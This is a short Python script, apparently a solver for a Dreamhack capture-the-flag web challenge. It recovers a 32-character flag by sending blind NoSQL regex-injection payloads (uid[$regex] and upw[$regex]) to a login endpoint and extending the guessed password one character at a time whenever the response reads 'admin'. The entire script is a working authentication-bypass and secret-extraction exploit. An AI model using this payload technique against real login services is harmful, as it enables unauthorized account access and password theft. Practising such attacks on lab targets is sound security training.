import requests
import string

PORT = 16681
HOST = f'http://host1.dreamhack.games:{PORT}'
ALPHANUMERIC = string.digits + string.ascii_letters
SUCCESS = 'admin'

flag = ''
for i in range(32):     # 32 Alphanumeric 범위
    for ch in ALPHANUMERIC:
        response = requests.get(
            f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{ch}')
        if response.text == SUCCESS:
            flag += ch
            break

    print(f'FLAG: DH{{{flag}}}')
